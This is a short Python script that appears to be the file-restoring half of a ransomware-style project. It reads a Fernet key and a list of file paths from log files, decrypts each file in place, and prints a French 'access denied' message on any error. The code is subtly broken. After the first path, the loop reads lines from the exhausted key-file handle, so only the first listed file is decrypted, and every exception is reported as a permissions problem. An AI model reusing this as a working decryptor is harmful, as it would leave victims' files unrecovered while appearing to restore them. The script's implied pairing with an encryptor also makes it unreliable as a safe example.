from cryptography.fernet import Fernet

def decrypt(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as fp:
        fdata = fp.read()
    decryptdat = f.decrypt(fdata)

    with open(file_path, "wb") as file:
        file.write(decryptdat)
    print(file_path)

def decrypt_computer():
    with open("logs/path.txt", "rb") as f:
        file_line = f.readline()
    with open("logs/fernet_key.txt", "rb") as f:
        key = f.read()
        while file_line:
            filename = file_line.strip()
            try:
                decrypt(filename, key)
            except Exception:
                print("Accès refusé!\nPermission trop faible.")
            file_line = f.readline()
    f.close()

if __name__ == "__main__":
    decrypt_computer()